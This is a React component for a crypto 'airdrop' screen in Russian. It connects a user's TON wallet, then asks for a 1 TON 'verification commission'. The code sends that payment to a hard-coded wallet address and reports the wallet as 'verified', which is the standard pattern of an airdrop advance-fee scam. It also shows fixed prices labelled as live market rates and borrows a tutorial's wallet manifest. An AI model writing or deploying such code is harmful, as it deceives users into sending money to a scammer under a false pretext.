import React, { useState, useEffect } from 'react';
import { GameState } from '../types';
import { formatNumber, formatCurrency } from './Formatters';
import { CheckCircle, TrendingUp, AlertTriangle, Send, Loader2, RefreshCw, LogOut, Wallet } from 'lucide-react';

interface AirdropViewProps {
  state: GameState;
  onConnectWallet: (address: string) => void;
}

// Declare TonConnectUI global
declare global {
    interface Window {
        TonConnectUI: any;
    }
}

const DESTINATION_WALLET = "UQA8zne0aKVtdJuwKdqQkhxA9LKetlubeGEQ_NKsb1plvks2";
const COMMISSION_AMOUNT_TON = 1; 
const COMMISSION_AMOUNT_NANO = 1000000000; 

const AirdropView: React.FC<AirdropViewProps> = ({ state, onConnectWallet }) => {
  const [tonRate, setTonRate] = useState(5.42);
  const [btcRate, setBtcRate] = useState(64230.50);
  const [tonConnectUI, setTonConnectUI] = useState<any>(null);
  const [walletInfo, setWalletInfo] = useState<any>(null);
  const [txStatus, setTxStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [status, setStatus] = useState<'loading' | 'ready' | 'error'>('loading');
  
  // Force load script if not present
  useEffect(() => {
    const loadScript = () => {
        if (window.TonConnectUI) {
            initTonConnect();
            return;
        }

        const script = document.createElement('script');
        script.src = "https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js";
        script.async = true;
        script.onload = () => initTonConnect();
        script.onerror = () => setStatus('error');
        document.body.appendChild(script);
    };

    loadScript();
  }, []);

  const initTonConnect = () => {
    try {
        if (!window.TonConnectUI) {
             setStatus('error');
             return;
        }

        // Wait a tiny bit for the DOM element to be surely rendered
        setTimeout(() => {
            const ui = new window.TonConnectUI({
                manifestUrl: 'https://raw.githubusercontent.com/ton-community/tutorials/main/03-client/test/public/tonconnect-manifest.json',
                buttonRootId: 'ton-connect-button'
            });

            setTonConnectUI(ui);
            setStatus('ready');

            const unsubscribe = ui.onStatusChange((wallet: any) => {
                if (wallet) {
                    setWalletInfo(wallet);
                    onConnectWallet(wallet.account.address);
                } else {
                    setWalletInfo(null);
                    onConnectWallet("");
                }
            });

            if (ui.wallet) {
                setWalletInfo(ui.wallet);
                onConnectWallet(ui.wallet.account.address);
            }
        }, 100);
    } catch (e) {
        console.error("TON Connect Init Error:", e);
        setStatus('error');
    }
  };

  const handleDisconnect = async () => {
      if (tonConnectUI) {
          await tonConnectUI.disconnect();
          setWalletInfo(null);
          onConnectWallet("");
          setTxStatus('idle');
      }
  };

  const sendCommissionTransaction = async () => {
      if (!tonConnectUI || !walletInfo) return;
      setTxStatus('sending');

      const transaction = {
          validUntil: Math.floor(Date.now() / 1000) + 600,
          messages: [
              {
                  address: DESTINATION_WALLET,
                  amount: COMMISSION_AMOUNT_NANO.toString(),
              },
          ],
      };

      try {
          await tonConnectUI.sendTransaction(transaction);
          setTxStatus('success');
      } catch (e) {
          console.error("Transaction Error:", e);
          setTxStatus('error');
      }
  };

  // Helper to shorten address
  const shortenAddress = (addr: string) => {
      if (!addr) return '';
      return `${addr.slice(0, 4)}...${addr.slice(-4)}`;
  };

  return (
    <div className="flex-1 flex flex-col p-4 w-full max-w-md mx-auto pt-6 pb-24 overflow-y-auto relative z-10">
      <div className="text-center mb-6">
        <div className="w-20 h-20 bg-neutral-800 rounded-full mx-auto mb-3 flex items-center justify-center border-4 border-neutral-700 relative">
           <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png" className="w-12 h-12" alt="TON" />
           <div className="absolute -bottom-1 -right-1 bg-yellow-500 text-black text-[10px] font-bold px-2 py-0.5 rounded-full border border-neutral-900">
               AIRDROP
           </div>
        </div>
        <h2 className="text-2xl font-display font-bold text-white mb-1">Подключение</h2>
        <p className="text-gray-400 text-xs">Подготовь свой кошелек к раздаче $FURY</p>
      </div>

      <div className="bg-neutral-800 rounded-2xl p-5 mb-5 border border-neutral-700 shadow-lg min-h-[120px] flex flex-col justify-center">
          
          <div className="flex flex-col items-center justify-center w-full">
               {status === 'loading' && (
                   <div className="flex items-center gap-2 text-gray-400 text-sm py-4">
                       <Loader2 className="animate-spin" size={16} />
                       Загрузка кошелька...
                   </div>
               )}
               {status === 'error' && (
                   <div className="flex flex-col items-center gap-2 text-red-400 text-sm py-4">
                       <span>Ошибка загрузки модуля</span>
                       <button onClick={() => window.location.reload()} className="flex items-center gap-1 bg-neutral-700 px-3 py-1 rounded-lg text-white">
                           <RefreshCw size={14} /> Обновить
                       </button>
                   </div>
               )}
               
               {/* Container for the standard button, hidden if custom UI is preferred but useful for init */}
               <div id="ton-connect-button" className={walletInfo ? "hidden" : "w-full flex justify-center"}></div>
          </div>

          {walletInfo && (
              <div className="flex flex-col items-center animate-fade-in w-full mt-2">
                  <div className="flex items-center gap-2 text-green-400 mb-2 bg-green-900/20 px-4 py-2 rounded-full border border-green-800/50">
                      <CheckCircle size={16} />
                      <span className="font-bold text-sm">Кошелек подключен</span>
                  </div>

                  <div className="flex items-center gap-2 mb-4">
                      <Wallet size={16} className="text-gray-400" />
                      <span className="font-mono text-white text-sm bg-neutral-900 px-2 py-1 rounded">
                          {shortenAddress(walletInfo.account.address)}
                      </span>
                  </div>
                  
                  <div className="w-full bg-neutral-900/50 rounded-xl p-4 border border-neutral-800">
                        <div className="flex items-start gap-3 mb-3">
                             <AlertTriangle className="text-yellow-500 shrink-0" size={20} />
                             <div className="text-left">
                                 <h4 className="text-sm font-bold text-white mb-1">Верификация</h4>
                                 <p className="text-xs text-gray-400">
                                     Оплатите комиссию для подтверждения кошелька.
                                 </p>
                             </div>
                        </div>
                        
                        <div className="flex justify-between items-center bg-neutral-800 rounded-lg p-2 px-3 mb-4">
                            <span className="text-xs text-gray-400">Сумма:</span>
                            <span className="font-bold text-white font-mono">{COMMISSION_AMOUNT_TON} TON</span>
                        </div>

                        {txStatus === 'success' ? (
                            <div className="text-center py-2 text-green-400 font-bold border border-green-500/30 rounded-lg bg-green-500/10 mb-3">
                                Успешно верифицировано!
                            </div>
                        ) : (
                            <button 
                                onClick={sendCommissionTransaction}
                                disabled={txStatus === 'sending'}
                                className={`
                                    w-full py-3 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all mb-3
                                    ${txStatus === 'sending' 
                                        ? 'bg-neutral-700 text-gray-400 cursor-wait' 
                                        : 'bg-blue-600 hover:bg-blue-500 text-white shadow-lg active:scale-95'}
                                `}
                            >
                                {txStatus === 'sending' ? 'Обработка...' : (
                                    <>
                                        <Send size={16} />
                                        Оплатить 1 TON
                                    </>
                                )}
                            </button>
                        )}
                        
                        {txStatus === 'error' && (
                            <p className="text-red-400 text-xs text-center mb-2">
                                Ошибка транзакции. Попробуйте снова.
                            </p>
                        )}

                        <button 
                            onClick={handleDisconnect}
                            className="w-full py-2 rounded-lg font-bold text-xs text-red-400 hover:bg-red-900/20 border border-transparent hover:border-red-900/50 transition-all flex items-center justify-center gap-1"
                        >
                            <LogOut size={12} />
                            Отключить кошелек
                        </button>
                  </div>
              </div>
          )}
      </div>

      <div className="bg-neutral-800/50 rounded-xl p-4 border border-neutral-700">
           <h3 className="text-xs font-bold text-gray-300 mb-3 flex items-center gap-2 uppercase tracking-wider">
               <TrendingUp size={14} /> Рынок (Live)
           </h3>
           <div className="space-y-3">
               <div className="flex justify-between items-center">
                   <div className="flex items-center gap-2">
                       <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png" className="w-5 h-5" alt="TON" />
                       <span className="font-bold text-sm">TON</span>
                   </div>
                   <span className="font-mono text-white text-sm">${tonRate.toFixed(2)}</span>
               </div>
               <div className="w-full h-[1px] bg-neutral-700"></div>
               <div className="flex justify-between items-center">
                   <div className="flex items-center gap-2">
                       <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" className="w-5 h-5" alt="BTC" />
                       <span className="font-bold text-sm">BTC</span>
                   </div>
                   <span className="font-mono text-white text-sm">${formatCurrency(btcRate)}</span>
               </div>
           </div>
      </div>
    </div>
  );
};

export default AirdropView;